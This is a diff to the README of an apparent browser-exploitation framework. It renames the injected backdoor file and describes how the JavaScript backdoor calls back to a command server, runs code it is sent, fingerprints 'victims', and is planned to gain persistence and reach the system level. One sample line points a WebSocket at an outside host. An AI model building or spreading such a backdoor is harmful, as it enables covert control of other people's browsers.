@@ -2,7 +2,7 @@
 A framework for exploiting browsers by injecting Javascript to a web-based backdoor
 
 # Aim of the project
-- After a backdoor is injected in the browser (backdoor.html) the backdoor will try a websocket first and otherwise poll with GET requests. If a GET request succeeds but no websocket is possible (browser incompatible, proxy, filter, ... ) it will communicate in both ways with respectivly GET and reponse-headers.
+- After a backdoor is injected in the browser (spear.html) the backdoor will try a websocket first and otherwise poll with GET requests. If a GET request succeeds but no websocket is possible (browser incompatible, proxy, filter, ... ) it will communicate in both ways with respectivly GET and reponse-headers.
 - When a connection is available to a host it can be send Javascript-code to be executed on the machine
 - Clients will be identified from the server with a couple commands and a database will be kept in a plain file
 - The interface will be combined with the server (nodejs for async events). If the server is already running, make a connection to the existing server through HTTP requests or a websocket to have the same level of access
@@ -29,7 +29,7 @@ A framework for exploiting browsers by injecting Javascript to a web-based backd
 
 # TODO & Roadmap
 - if necessairy ask to clean port (if something is running on it, maybe pinpoint it) (maybe make bash script starter that checks this?)
-- (DONE) For testing, if the servers root is requested, return the backdoor.html file
+- (DONE) For testing, if the servers root is requested, return the spear.html file
 - backdoor must be built to only provide the URL to connect to if it was not already set. so that the url can be changed by adding an extra script-segment with "var socket = new WebSocket('ws://wereiwanttogo.com:1337')"
 - (DONE) interface should take commands to be sent to victims.
 - (DONE) a new connection should be fingerprinted 
@@ -38,7 +38,7 @@ A framework for exploiting browsers by injecting Javascript to a web-based backd
 - input should be able to be corrected and navigated by the arrow keys without creating escape characters (https://scotch.io/tutorials/build-an-interactive-command-line-application-with-nodejs)
 - interface with more layers to list and send commands specific to victim
 - GET call to server (from local) to generate payload (newest version) with specified URL to be directed to
-- Help command in interface should explain how iframe can be use for the injection of backdoor.html by tool like bettercap (for example)
+- Help command in interface should explain how iframe can be use for the injection of spear.html by tool like bettercap (for example)
 - look for persistance options in same manner as poisontab, Also try migration to other tabs
 - Penetration to system-level attacks
 - History of commands (up and down arrow key) -> prompt library
